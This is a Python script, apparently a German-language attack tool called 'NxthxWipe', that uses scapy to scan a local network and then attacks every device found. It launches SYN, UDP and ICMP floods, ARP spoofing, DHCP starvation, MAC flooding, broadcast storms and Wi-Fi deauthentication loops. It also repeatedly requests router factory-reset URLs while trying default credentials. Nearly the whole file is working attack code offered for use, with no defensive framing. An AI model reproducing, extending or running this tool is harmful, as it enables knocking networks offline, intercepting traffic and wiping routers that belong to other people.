#!/usr/bin/env python3
# Author: LXXNDX-PXNDX
import threading
import time
import random
import os
import sys
from collections import defaultdict
from scapy.all import IP, TCP, UDP, ICMP, send, srp, ARP, Ether, conf, RandMAC

conf.verb = 0

class AggressiveWipe:
    def __init__(self):
        self.running = True
        self.stats = defaultdict(lambda: {'syn': 0, 'udp': 0, 'icmp': 0, 'arp': 0})
        self.devices = []
        self.router_ip = ""
        self.start_time = 0

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def log(self, msg):
        print(msg)

    def get_network_range(self, router_ip):
        parts = router_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    def arp_scan(self, network):
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]
        return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]

    # --- SYN FLOOD (unendlich, kein Sleep) ---
    def syn_flood(self, target_ip):
        while self.running:
            sport = random.randint(1024, 65535)
            ip = IP(dst=target_ip)
            tcp = TCP(sport=sport, dport=random.choice([80,443,22,8080,53,445,1433,3306]), flags="S")
            send(ip/tcp, verbose=0, count=5)
            self.stats[target_ip]['syn'] += 5

    # --- UDP FLOOD (maximale Größe) ---
    def udp_flood(self, target_ip):
        while self.running:
            payload = random._urandom(1472)  # Maximale UDP-Payload ohne Fragmentierung
            ip = IP(dst=target_ip)
            udp = UDP(sport=random.randint(1024,65535), dport=random.choice([53,123,161,1900,5060,33434]))
            send(ip/udp/payload, verbose=0, count=5)
            self.stats[target_ip]['udp'] += 5

    # --- ICMP FLOOD (Ping of Death) ---
    def icmp_flood(self, target_ip):
        while self.running:
            ip = IP(dst=target_ip)
            icmp = ICMP(type=8, code=0)
            payload = random._urandom(65000)  # Riesige Pakete
            send(ip/icmp/payload, verbose=0, count=3)
            self.stats[target_ip]['icmp'] += 3

    # --- ARP SPOOFING (Dauerfeuer) ---
    def arp_spoof(self, target_ip, router_ip):
        target_mac = self.get_mac(target_ip)
        router_mac = self.get_mac(router_ip)
        if not target_mac or not router_mac:
            return
        while self.running:
            send(ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac), verbose=0, count=10)
            send(ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac), verbose=0, count=10)
            self.stats[target_ip]['arp'] += 20
            time.sleep(0.05)

    # --- DEAUTH LOOP (wenn möglich) ---
    def deauth_loop(self, router_mac):
        while self.running:
            os.system(f"aireplay-ng -0 0 -a {router_mac} wlan0mon 2>/dev/null &")
            time.sleep(0.5)

    # --- DHCP STARVATION ---
    def dhcp_starvation(self, network):
        while self.running:
            fake_mac = RandMAC()
            dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
                            BOOTP(op=1, chaddr=fake_mac) / \
                            DHCP(options=[("message-type", "discover"), "end"])
            send(dhcp_discover, verbose=0, count=20)
            time.sleep(0.01)

    # --- MAC FLOODING ---
    def mac_flooding(self):
        while self.running:
            fake_mac = RandMAC()
            ether = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
            send(ether, verbose=0, count=50)
            time.sleep(0.005)

    # --- BROADCAST STORM (zusätzlich) ---
    def broadcast_storm(self):
        while self.running:
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            ip = IP(dst="255.255.255.255")
            payload = random._urandom(1400)
            send(ether/ip/payload, verbose=0, count=20)
            time.sleep(0.01)

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        return None

    def router_reset_extreme(self, router_ip):
        import requests
        from requests.auth import HTTPBasicAuth
        urls = [
            f"http://{router_ip}/cgi-bin/reboot?factory=1",
            f"http://{router_ip}/reset.htm",
            f"http://{router_ip}/goform/reset",
            f"http://{router_ip}/boaform/admin/formReset",
            f"http://{router_ip}/setup.cgi?next_file=restore.htm",
            f"http://{router_ip}/restore",
            f"http://{router_ip}/cgi-bin/luci/;stok=/locale?factory=1",
            f"http://{router_ip}/reset"
        ]
        defaults = [("admin","admin"), ("admin",""), ("root","admin"), ("user","user"), 
                    ("admin","password"), ("root","root"), ("admin","1234")]
        while self.running:
            for url in urls:
                for user, pw in defaults:
                    try:
                        requests.get(url, auth=HTTPBasicAuth(user, pw), timeout=0.5)
                    except:
                        pass
            time.sleep(1)

    def live_ui(self):
        """Zeigt Live-Statistiken im Terminal"""
        while self.running:
            self.clear_screen()
            elapsed = time.time() - self.start_time
            print("\033[91m" + "="*70 + "\033[0m")
            print("\033[91m🔥 NXTHWIPE – ULTRA AGGRESSIVE 🔥\033[0m".center(70))
            print(f"Laufzeit: {int(elapsed)} Sekunden | Router: {self.router_ip}")
            print("\033[91m" + "="*70 + "\033[0m")
            print(f"{'IP-Adresse':<18} {'SYN':<10} {'UDP':<10} {'ICMP':<10} {'ARP':<10} {'Total':<10}")
            print("-"*70)
            total_stats = {'syn':0, 'udp':0, 'icmp':0, 'arp':0}
            for dev in self.devices:
                ip = dev['ip']
                s = self.stats[ip]
                total = s['syn'] + s['udp'] + s['icmp'] + s['arp']
                print(f"{ip:<18} {s['syn']:<10} {s['udp']:<10} {s['icmp']:<10} {s['arp']:<10} {total:<10}")
                total_stats['syn'] += s['syn']
                total_stats['udp'] += s['udp']
                total_stats['icmp'] += s['icmp']
                total_stats['arp'] += s['arp']
            print("-"*70)
            grand_total = total_stats['syn'] + total_stats['udp'] + total_stats['icmp'] + total_stats['arp']
            print(f"GESAMT: SYN={total_stats['syn']} UDP={total_stats['udp']} ICMP={total_stats['icmp']} ARP={total_stats['arp']} | TOTAL={grand_total}")
            print("\033[91m" + "="*70 + "\033[0m")
            print("🔥 ANGRIFFE AKTIV: SYN Flood | UDP Flood | ICMP Flood | ARP Spoofing | DHCP Starvation | MAC Flooding | Broadcast Storm | Router Reset 🔥")
            print("💀 Drücke ENTER, um alle Angriffe zu stoppen 💀")
            time.sleep(1)

    def start_attack(self, router_ip):
        self.router_ip = router_ip
        self.start_time = time.time()
        self.log(f"Scanne Netzwerk...")
        network = self.get_network_range(router_ip)
        self.devices = self.arp_scan(network)
        if not self.devices:
            self.log("Keine Geräte gefunden! Abbruch.")
            return
        self.log(f"{len(self.devices)} Geräte gefunden. Starte Angriffe...")

        # Starte alle Flood-Threads für jedes Gerät
        for dev in self.devices:
            ip = dev['ip']
            threading.Thread(target=self.syn_flood, args=(ip,), daemon=True).start()
            threading.Thread(target=self.udp_flood, args=(ip,), daemon=True).start()
            threading.Thread(target=self.icmp_flood, args=(ip,), daemon=True).start()
            threading.Thread(target=self.arp_spoof, args=(ip, router_ip), daemon=True).start()
            time.sleep(0.02)

        # Zusätzliche globale Angriffe
        threading.Thread(target=self.dhcp_starvation, args=(network,), daemon=True).start()
        threading.Thread(target=self.mac_flooding, daemon=True).start()
        threading.Thread(target=self.broadcast_storm, daemon=True).start()
        threading.Thread(target=self.router_reset_extreme, args=(router_ip,), daemon=True).start()

        # Deauth (optional)
        router_mac = self.get_mac(router_ip)
        if router_mac and os.path.exists("/usr/local/bin/aireplay-ng"):
            threading.Thread(target=self.deauth_loop, args=(router_mac,), daemon=True).start()
            self.log("Deauth-Loop gestartet")
        else:
            self.log("Deauth nicht verfügbar (keine Monitor Mode Karte)")

        # Live-UI starten
        self.live_ui()

    def run(self):
        self.clear_screen()
        print("\033[91m" + "="*70 + "\033[0m")
        print("\033[91m🔥 NXTHWIPE – ULTRA AGGRESSIVE EDITION 🔥\033[0m".center(70))
        print("\033[91m         von LXXNDX-PXNDX – KEINE GNADE\033[0m".center(70))
        print("\033[91m" + "="*70 + "\033[0m")
        router_ip = input("\nRouter IP (z.B. 192.168.1.1): ").strip()
        if not router_ip:
            print("Keine IP eingegeben.")
            return
        print("\n\033[91m☠️  ANGRIFF STARTET IN 3 SEKUNDEN – LETZTE CHANCE ☠️\033[0m")
        time.sleep(3)
        try:
            self.start_attack(router_ip)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            print("\n\033[92mAngriffe gestoppt. Auf Wiedersehen.\033[0m")
            sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Dieses Tool benötigt root-Rechte. Starte mit: sudo python3 NxthxWipe.py")
        sys.exit(1)
    # Scapy BOOTP/DHCP benötigt zusätzlichen Import
    from scapy.all import BOOTP, DHCP
    wipe = AggressiveWipe()
    wipe.run()
